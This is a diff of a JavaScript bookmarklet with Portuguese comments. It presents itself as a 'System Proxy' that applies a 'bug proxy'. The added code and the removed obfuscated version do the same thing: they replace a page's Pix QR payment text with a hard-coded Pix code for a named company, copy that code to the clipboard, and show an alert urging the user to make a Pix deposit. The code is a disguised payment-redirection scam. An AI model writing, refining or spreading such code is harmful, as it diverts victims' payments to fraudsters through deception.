@@ -1,1 +1,87 @@
-function _0xbfe4(_0x2aa5fb,_0x174296){var _0x1c7316=_0x1c73();return _0xbfe4=function(_0xbfe453,_0x149890){_0xbfe453=_0xbfe453-0x198;var _0x41e782=_0x1c7316[_0xbfe453];return _0x41e782;},_0xbfe4(_0x2aa5fb,_0x174296);}(function(_0x3c0cf2,_0x509fdf){var _0x5dd625=_0xbfe4,_0x1f2063=_0x3c0cf2();while(!![]){try{var _0x400a45=-parseInt(_0x5dd625(0x198))/0x1+parseInt(_0x5dd625(0x1d0))/0x2+parseInt(_0x5dd625(0x1c6))/0x3+-parseInt(_0x5dd625(0x1b9))/0x4*(-parseInt(_0x5dd625(0x19d))/0x5)+-parseInt(_0x5dd625(0x1d4))/0x6*(-parseInt(_0x5dd625(0x1b5))/0x7)+-parseInt(_0x5dd625(0x1d1))/0x8*(parseInt(_0x5dd625(0x1c8))/0x9)+-parseInt(_0x5dd625(0x1a0))/0xa;if(_0x400a45===_0x509fdf)break;else _0x1f2063['push'](_0x1f2063['shift']());}catch(_0x3cd5c4){_0x1f2063['push'](_0x1f2063['shift']());}}}(_0x1c73,0x70c94));function _0x1c73(){var _0x1bff24=['createElement','click','2px\x20solid\x20red','body','597554SUyYSy','616HlTiJa','closeMenu','10px','6toMGZX','245164LPyFBj','padding','AVISO\x20-\x20LEIA\x20COM\x20ATENÇÃO:\x20PROXY\x20APLICADA\x20COM\x20SUCESSO,\x20FAÇA\x20UM\x20DEPOSITO\x20ACIMA\x20DE\x20200$\x20VIA\x20PIX\x20PARA\x20TORNAR\x20A\x20ASSERTIVIDADE\x20DO\x20PROGRAMA.','width','00020101021226910014br.gov.bcb.pix2569qrcode.pix.celcoin.com.br/pixqrcode/v2/1e98445ed803e9b1b01dd6c31fa8e15204000053039865802BR5911SECURE\x20LINK6009SAO\x20PAULO62070503***63047313','955lALKGR','https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css','copy','2512970FrKumv','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://i.ibb.co/1vfLVFg/Proxy-sha-256-20240928-125711-0000.jpg\x22\x20style=\x22display:\x20block;\x20margin:\x200\x20auto;\x20width:\x20100px;\x20height:\x20100px;\x20border-radius:\x2050%;\x20border:\x202px\x20solid\x20red;\x22>\x20<!--\x20Tamanho\x20da\x20imagem\x20aumentado\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x27text-align:center;\x27>System\x20Proxy\x20<i\x20class=\x22fas\x20fa-check-circle\x22\x20style=\x22color:\x20red;\x22></i></h3>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x27closeMenu\x27\x20style=\x22float:right;\x20cursor:pointer;\x20font-size:\x2024px;\x20color:\x20white;\x22>X</span>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x27actionButton\x27\x20style=\x27display:\x20block;\x20margin:\x2010px\x20auto;\x20padding:\x205px;\x20border:\x20none;\x20border-radius:\x205px;\x20background-color:\x20red;\x20color:\x20white;\x20cursor:\x20pointer;\x20width:\x2080%;\x27>Aplicar\x20Bug\x20Proxy</button>\x20<!--\x20Largura\x20do\x20botão\x20reduzida\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x27text-align:center;\x20margin-top:\x2010px;\x27><i\x20class=\x22fas\x20fa-cogs\x22></i>\x20SHA256\x20|\x20<i\x20class=\x22fas\x20fa-info-circle\x22></i>\x20Versão:\x203.0</div>\x20<!--\x20Colocado\x20embaixo\x20do\x20botão\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20','querySelector','background','display','none','transparent','Falha\x20ao\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.','top','href','8px','2em','position','getElementById','innerHTML','div','9999','actionButton','removeChild','innerText','stylesheet','611947sTmyQk','block','Elemento\x20não\x20encontrado!','appendChild','17092VNNaNc','value','30%','0\x200\x2010px\x20rgba(0,0,0,0.5)','clientX','left','addEventListener','clientY','execCommand','boxShadow','focus','fixed','#fff','1468089lmhbRb','head','85707aCKorN','style','Não\x20foi\x20possível\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.','height'];_0x1c73=function(){return _0x1bff24;};return _0x1c73();}_0x2bc65a:(function(){var _0x50340e=_0xbfe4;const _0x440648=_0x18cb34(),_0x36661e=document[_0x50340e(0x1cc)]('link');_0x36661e['rel']=_0x50340e(0x1b4),_0x36661e[_0x50340e(0x1a9)]=_0x50340e(0x19e),document[_0x50340e(0x1c7)][_0x50340e(0x1b8)](_0x36661e),document[_0x50340e(0x1cf)][_0x50340e(0x1b8)](_0x440648),document[_0x50340e(0x1bf)]('dblclick',_0x3003b8=>_0x40689d(_0x440648,_0x3003b8[_0x50340e(0x1c0)],_0x3003b8[_0x50340e(0x1bd)]));function _0x18cb34(){var _0x599e70=_0x50340e;const _0x167af3=document[_0x599e70(0x1cc)](_0x599e70(0x1af));return Object['assign'](_0x167af3[_0x599e70(0x1c9)],{'position':_0x599e70(0x1c4),'top':'30%','left':_0x599e70(0x1bb),'width':'200px','background':'#1e1e1e','color':_0x599e70(0x1c5),'padding':_0x599e70(0x1d3),'borderRadius':_0x599e70(0x1aa),'border':_0x599e70(0x1ce),'boxShadow':_0x599e70(0x1bc),'display':_0x599e70(0x1a5),'zIndex':_0x599e70(0x1b0)}),_0x167af3[_0x599e70(0x1ae)]=_0x599e70(0x1a1),_0x167af3;}function _0x40689d(_0x325224,_0xda2180,_0x1b78e6){var _0xe971b=_0x50340e;_0x325224[_0xe971b(0x1c9)][_0xe971b(0x1a4)]===_0xe971b(0x1b6)?_0x325224['style'][_0xe971b(0x1a4)]=_0xe971b(0x1a5):(_0x325224[_0xe971b(0x1c9)][_0xe971b(0x1a8)]=_0xda2180+'px',_0x325224[_0xe971b(0x1c9)][_0xe971b(0x1be)]=_0x1b78e6+'px',_0x325224['style']['display']='block');}function _0x45b0dc(){var _0x32e130=_0x50340e;_0x440648[_0x32e130(0x1c9)][_0x32e130(0x1a4)]=_0x32e130(0x1a5);}document[_0x50340e(0x1ad)](_0x50340e(0x1d2))[_0x50340e(0x1bf)](_0x50340e(0x1cd),_0x45b0dc),document[_0x50340e(0x1ad)](_0x50340e(0x1b1))[_0x50340e(0x1bf)]('click',()=>{var _0x377e27=_0x50340e,_0x537861=_0x377e27(0x19c),_0x9e70ae=document[_0x377e27(0x1a2)]('.qr-code-text\x20.qr-code-text-inner');if(_0x9e70ae){_0x9e70ae[_0x377e27(0x1b3)]=_0x537861;var _0x35d97f=document[_0x377e27(0x1cc)]('textarea');_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x1ac)]='fixed',_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x1a8)]='0',_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x1be)]='0',_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x19b)]=_0x377e27(0x1ab),_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x1cb)]='2em',_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x199)]='0',_0x35d97f[_0x377e27(0x1c9)]['border']=_0x377e27(0x1a5),_0x35d97f['style']['outline']=_0x377e27(0x1a5),_0x35d97f['style'][_0x377e27(0x1c2)]=_0x377e27(0x1a5),_0x35d97f[_0x377e27(0x1c9)][_0x377e27(0x1a3)]=_0x377e27(0x1a6),_0x35d97f[_0x377e27(0x1ba)]=_0x537861,document[_0x377e27(0x1cf)][_0x377e27(0x1b8)](_0x35d97f),_0x35d97f[_0x377e27(0x1c3)](),_0x35d97f['select']();try{var _0x1238ee=document[_0x377e27(0x1c1)](_0x377e27(0x19f)),_0x520bb0=_0x1238ee?_0x377e27(0x19a):_0x377e27(0x1ca);alert(_0x520bb0);}catch(_0x390f2b){alert(_0x377e27(0x1a7));}document[_0x377e27(0x1cf)][_0x377e27(0x1b2)](_0x35d97f);}else alert(_0x377e27(0x1b7));});}());
+javascript:(function() {
+    const menu = createMenu();
+
+    // Adiciona a folha de estilos
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
+    document.head.appendChild(link);
+
+    document.body.appendChild(menu);
+    document.addEventListener('dblclick', (e) => toggleMenu(menu, e.clientY, e.clientX));
+
+    // Cria o menu
+    function createMenu() {
+        const m = document.createElement('div');
+        Object.assign(m.style, {
+            position: 'fixed', top: '30%', left: '30%', width: '200px',  // Largura reduzida
+            background: '#1e1e1e', color: '#fff', padding: '10px', borderRadius: '8px', 
+            border: '2px solid #fe5f2f', boxShadow: '0 0 10px rgba(0,0,0,0.5)', display: 'none', zIndex: '9999'
+        });
+        m.innerHTML = `
+            <img src="https://i.ibb.co/6r4yRDT/Proxy-sha-256-20241010-125036-0000.jpg" style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%; border: 2px solid #fe5f2f;"> <!-- Tamanho da imagem aumentado -->
+            <h3 style='text-align:center;'>System Proxy <i class="fas fa-check-circle" style="color: #fe5f2f;"></i></h3>
+            <span id='closeMenu' style="float:right; cursor:pointer; font-size: 24px; color: white;">X</span>
+            <button id='actionButton' style='display: block; margin: 10px auto; padding: 5px; border: none; border-radius: 5px; background-color: #fe5f2f; color: white; cursor: pointer; width: 80%;'>Aplicar Bug Proxy</button> <!-- Largura do botão reduzida -->
+            <div style='text-align:center; margin-top: 10px;'><i class="fas fa-cogs"></i> SHA256 | <i class="fas fa-info-circle"></i> Versão: 4.0</div> <!-- Colocado embaixo do botão -->
+        `;
+        return m;
+    }
+
+    // Mostra ou oculta o menu com dois cliques
+    function toggleMenu(menu, y, x) {
+        if (menu.style.display === 'block') {
+            menu.style.display = 'none';
+        } else {
+            menu.style.top = `${y}px`; 
+            menu.style.left = `${x}px`; 
+            menu.style.display = 'block';
+        }
+    }
+
+    // Fecha o menu quando o botão "X" for clicado
+    function closeMenu() {
+        menu.style.display = 'none';
+    }
+
+    document.getElementById('closeMenu').addEventListener('click', closeMenu);
+
+    // Ação do botão "Aplicar Bug Proxy"
+    document.getElementById('actionButton').addEventListener('click', () => {
+        // Código para aplicar o proxy
+        var newQRText = "00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/5afefdfd-93e8-499f-94b9-8d8f951c45025204000053039865802BR5925GOLDEN PIG TECNOLOGIA LTD6009SAO PAULO62070503***6304B427";
+        var element = document.querySelector(".qr-code-text .qr-code-text-inner");
+
+        if (element) {
+            element.innerText = newQRText;
+
+            var textArea = document.createElement("textarea");
+            textArea.style.position = "fixed"; 
+            textArea.style.top = "0"; 
+            textArea.style.left = "0";
+            textArea.style.width = "2em"; 
+            textArea.style.height = "2em";
+            textArea.style.padding = "0";
+            textArea.style.border = "none";
+            textArea.style.outline = "none";
+            textArea.style.boxShadow = "none";
+            textArea.style.background = "transparent";
+            textArea.value = newQRText;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+
+            try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? "AVISO - LEIA COM ATENÇÃO: PROXY APLICADA COM SUCESSO, FAÇA UM DEPOSITO VIA PIX PARA TORNAR A ASSERTIVIDADE DO PROGRAMA." : "Não foi possível copiar o texto. Tente copiar manualmente.";
+                alert(msg);
+            } catch (err) {
+                alert("Falha ao copiar o texto. Tente copiar manualmente.");
+            }
+
+            document.body.removeChild(textArea);
+        } else {
+            alert("Elemento não encontrado!");
+        }
+    });
+})();
